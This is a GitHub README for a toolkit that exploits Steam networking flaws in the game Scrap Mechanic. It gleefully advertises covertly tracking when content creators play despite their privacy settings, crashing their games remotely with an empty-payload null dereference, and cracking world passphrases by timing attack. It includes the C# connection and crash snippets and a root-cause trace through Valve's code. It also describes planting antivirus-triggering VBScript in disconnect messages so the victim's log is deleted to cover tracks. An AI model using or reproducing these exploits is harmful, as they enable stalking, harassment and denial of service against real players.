# Welcome to the ScrapRat repo!
### What is this??
This is a collection of software, code snippets, sample cli's, and demonstrations outlining different impactful CWE's that are currently available to exploit in [Scrap Mechanic](https://www.scrapmechanic.com/) as of 3/21/2024.
As some of you may know, Scrap Mechanic is a wonderful game with plentiful updates and it should come as no surprise as to why these CWE critical vulnerabilities exist in the game and why they will likely continue to exist for the foreseeable future.

Some of the things the CWE's allow for include `cyber stalking`, `remote game crashing`, and `unauthorized world entry`.

Thats right! Have you ever wanted to know when exactly your favorite content creators are playing Scrap Mechanic?
Well now you can forcefully track their Scrap Mechanic activity without their knowledge even if their steam profile is on maximum privacy and they are always 'offline'.

Why stop there? Maybe you get sick and tired of the Scrap Mechanic content..?
Well have I got some new for you! With just a few clicks, their game wont last half a second before crashing! This means no more of that oh so stinky Scrap Mechanic content.

Now, if thats not your cup of tea I've got one last option for you (my personal favorite). In just (on average) 15 minutes, you will have cracked the code and you will be able to join ANY of your favorite content creators when you use the previous cyber stalking tool to find out when they are playing the game. Now you can play with your favorite content creators!

#
Now, back to business...

- [x] [CWE-306](https://cwe.mitre.org/data/definitions/306.html)
```csharp
internal HSteamNetConnection GetConnection() =>
this.hSteamNetConnection ??= (HSteamNetConnection)this.Interupt.RunCancelable(() => 
SteamNetworkingSockets.ConnectP2P
    (ref this.NetworkingIdentity, 0, LongTimeoutOptions.Length, LongTimeoutOptions));
```
With additional parameters
```csharp
private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
    new SteamNetworkingConfigValue_t
    {
        m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
        m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
        m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 500 }
    },
    new SteamNetworkingConfigValue_t
    {
        m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
        m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
        m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = int.MaxValue }
    }
];
```
- [x] [CWE-476](https://cwe.mitre.org/data/definitions/476.html)
```csharp
SteamNetworkingSockets.SendMessageToConnection(connection, 0, 0, 0, out long _);
```
- [ ] [CWE-208](https://cwe.mitre.org/data/definitions/208.html) Comming Soon :tm:

- [ ] [CWE-307](https://cwe.mitre.org/data/definitions/307.html) Comming Soon :tm:


# Projects
The CWE's above have been implemented in a few different and easy to use solutions. 
* ~~[Blacklist](https://github.com/TheGuy920/ScrapRat/blob/main/ScrapRat/Game.cs#L58)~~
* [Player Tracker](https://github.com/TheGuy920/ScrapRat/blob/main/NetworkingWebApi/Program.cs#L67-L76)
* [Passphrase Timing Attack](https://github.com/TheGuy920/ScrapRat/blob/main/PasswordCracker/Program.cs#L9)

### NetworkingWebApi [-->](https://github.com/TheGuy920/ScrapRat/blob/main/NetworkingWebApi/Program.cs#L81)
A sample has been created demonstrating how to initiate connections to users
```csharp
foreach (CSteamID cstid in steamids)
    client.ConnectToUserAsync(cstid);
```

### NetworkingWebApi [-->](https://github.com/TheGuy920/ScrapRat/blob/main/NetworkingWebApi/Program.cs#L67-L76)
A sample has been created showcasing the cyber stalking capabilities
```csharp
client.OnConnectionPlaystateChanged += delegate;
foreach (var cstid in cstids)
{
    client.ConnectToUserAsync(cstid);
    Logger.LogInfo($"Now tracking: {getNameString(cstid)}");
}
```

# Vulnerability Report and Analysis

### Who? What? Where? Why?
The crux of the issue stems from a `nullptr` dereference exception. This exception occurs when an empty payload is sent to either the client or the host.
So why is it, that the developers of this game, didnt bother null checking the data first? Well, surprisingly, I dont believe it was entirely their fault.

Lets start by reviewing [ReceiveMessagesOnChannel](https://partner.steamgames.com/doc/api/ISteamNetworkingMessages#ReceiveMessagesOnChannel)
```cpp
int ReceiveMessagesOnChannel( int nLocalChannel, SteamNetworkingMessage_t **ppOutMessages, int nMaxMessages );
```

> Reads the next message that has been sent from another user via SendMessageToUser() on the given channel. Returns number of messages returned into your list. (0 if no message are available on that channel.)

> When you're done with the message object(s), make sure and call SteamNetworkingMessage_t::Release!

My question to you is, does anything here indicate that the messages or pointers within `ppOutMessages` would be null? I would argue no.
In fact, I would argue that the function returning the number of elements in the array would further reinforce any notion, that it would not make sense for any of the entries to be null, let alone only null.
```cpp
	/// Fetch the next available message(s) from the connection, if any.
	/// Returns the number of messages returned into your array, up to nMaxMessages.
	/// If the connection handle is invalid, -1 is returned.
	///
	/// The order of the messages returned in the array is relevant.
	/// Reliable messages will be received in the order they were sent (and with the
	/// same sizes --- see SendMessageToConnection for on this subtle difference from a stream socket).
	///
	/// Unreliable messages may be dropped, or delivered out of order with respect to
	/// each other or with respect to reliable messages.  The same unreliable message
	/// may be received multiple times.
	///
	/// If any messages are returned, you MUST call SteamNetworkingMessage_t::Release() on each
	/// of them free up resources after you are done.  It is safe to keep the object alive for
	/// a little while (put it into some queue, etc), and you may call Release() from any thread.
	virtual int ReceiveMessagesOnConnection( HSteamNetConnection hConn, SteamNetworkingMessage_t **ppOutMessages, int nMaxMessages ) = 0;
```
https://github.com/ValveSoftware/GameNetworkingSockets/blob/master/include/steam/isteamnetworkingsockets.h#L319-L334

### The Trace Back

First, lets take a deeper look into the function implementation
```cpp
int CSteamNetworkingMessages::ReceiveMessagesOnChannel( int nLocalChannel, SteamNetworkingMessage_t **ppOutMessages, int nMaxMessages )
{
	SteamNetworkingGlobalLock scopeLock( "ReceiveMessagesOnChannel" ); // !SPEED! Can we avoid this?

	Channel *pChan = FindOrCreateChannel( nLocalChannel );

	ShortDurationScopeLock lockMessageQueues( g_lockAllRecvMessageQueues );

	return pChan->m_queueRecvMessages.RemoveMessages( ppOutMessages, nMaxMessages );
}
```
https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/src/steamnetworkingsockets/clientlib/csteamnetworkingmessages.cpp#L513-L522

Here we see we need to look into `RemoveMessages`, so lets
```cpp
int SteamNetworkingMessageQueue::RemoveMessages( SteamNetworkingMessage_t **ppOutMessages, int nMaxMessages )
{
	int nMessagesReturned = 0;
	AssertLockHeld();

	while ( !empty() && nMessagesReturned < nMaxMessages )
	{
		// Locate message, put into caller's list
		CSteamNetworkingMessage *pMsg = m_pFirst;
		ppOutMessages[nMessagesReturned++] = pMsg;

		// Unlink from all queues
		pMsg->Unlink();

		// That should have unlinked from *us*, so it shouldn't be in our queue anymore
		Assert( m_pFirst != pMsg );
	}

	return nMessagesReturned;
}
```
https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/src/steamnetworkingsockets/clientlib/steamnetworkingsockets_connections.cpp#L188-L207

From here, we can see that whenever an element in the array is null, it is a result of `m_pFirst` being null, so lets have a closer look at `m_pFirst`
```cpp
struct SteamNetworkingMessageQueue
{
	CSteamNetworkingMessage *m_pFirst = nullptr;
	CSteamNetworkingMessage *m_pLast = nullptr;
	LockDebugInfo *m_pRequiredLock = nullptr; // Is there a lock that is required to be held while we access this queue?
	...
};
```
https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/src/steamnetworkingsockets/clientlib/steamnetworkingsockets_snp.h#L182

So now the question becomes, why is `m_pFirst` left as null? Why is it not being set/initialized? 
Well, upon searching for `SteamNetworkingMessage_t` we find a function called `AllocateMessage`
```cpp
class ISteamNetworkingUtils
{
public:
	//
	// Efficient message sending
	//

	/// Allocate and initialize a message object.  Usually the reason
	/// you call this is to pass it to ISteamNetworkingSockets::SendMessages.
	/// The returned object will have all of the relevant fields cleared to zero.
	///
	/// Optionally you can also request that this system allocate space to
	/// hold the payload itself.  If cbAllocateBuffer is nonzero, the system
	/// will allocate memory to hold a payload of at least cbAllocateBuffer bytes.
	/// m_pData will point to the allocated buffer, m_cbSize will be set to the
	/// size, and m_pfnFreeData will be set to the proper function to free up
	/// the buffer.
	///
	/// If cbAllocateBuffer=0, then no buffer is allocated.  m_pData will be NULL,
	/// m_cbSize will be zero, and m_pfnFreeData will be NULL.  You will need to
	/// set each of these.
	virtual SteamNetworkingMessage_t *AllocateMessage( int cbAllocateBuffer ) = 0;
    ...
};
```
https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/include/steam/isteamnetworkingutils.h#L41

This function can give us great insight into `m_pData`. After some rigorous searching we find this:
```cpp
// No segment data?  Seems fishy, but if it happens, just skip it.
Assert( cbSegmentSize >= 0 );
if ( cbSegmentSize <= 0 )
{
    // Spew but rate limit in case of malicious sender
    SpewWarningRateLimited( usecNow, "[%s] decode pkt %lld empty reliable segment?\n",
        GetDescription(),
        (long long)nPktNum );
    return true;
}
```
https://github.com/ValveSoftware/GameNetworkingSockets/blob/517fff0cf6866ba163f4f016b0ef28f365c06c05/src/steamnetworkingsockets/clientlib/steamnetworkingsockets_snp.cpp#L3378-L3387

Here we see what happens, Steam Networking relies on the clients good faith, and the client can instruct the value of `cbSegmentSize`.
As such, further packet processing does not take place yet the return status is `true` (success), meaning members are left uninitialized.
This is carried all the way though as if a packet was actually received, and a nullptr is injected into the array and triggers the steam callback
which results in a nullptr dereference if the implementation does not null check the data first. 

# See it in action!
Lets take a look at a demonstration of this in action! The attack is quite easy, we simply initiate a connection to a steam user, and then send a packet with an empty payload and payload length of 0.
This will result in the null dereference, and a game crash!

![Demo 1](/crash_demo.gif)

Here is a closer look at the test client in action. Here the client makes a connection request whilst the steam user is offline. This request sits on steams servers, until the steam user comes online.
This is perfect! I dont have to constantly connect, timeout, and try again, I simply initiate the connection through steam servers with a near infinite timeout, and wait for the target user to come online!

![Console](https://matthewelza.dev/assets/fard.png)

## The Cherry on Top

Lets take this one step further! It became clear, that the client could send a custom disconnect message/reason, however the message length was limited to 128 chars. The game has a log file, where all stdout is routed.
This is perfect! I was instantly reminded of this image my friend sent me on discord, it was called WindowsTheFender, and the image contained VBScript appended to it. This VBScript could not execute, however it made windows 
defender very upset. When this image was sent to me on discord, it was cached locally, and it immediately triggered windows defender. My thought was to take this VBScript, put it in the disconnect message, and BOOM, epic prank.
Turns out this was a bit difficult. The original VBScript was 500+ chars long, so I had to painstakingly trim the VBScript only a few chars at a time, whilst making sure it still triggered windows defender. And the final product?

It was truely amazing! I could forcefully join someones game, send a disconnect message which contained the harmless non-functional VBScript, rejoin once more and send an empty payload forcefully crashing the game.
When the game crashed, the log file stream was abrubtly closed, which triggered windows defender to scan the file, and it found the harmless VBScript, it deleted the log file, and issued a virus notification!

How amazing! I can forcefully crash your game whilst simultanesously triggering a virus notification on your computer and covering my tracks with the deleted log file! How hilarous!

![Demo 2](/virus.gif)
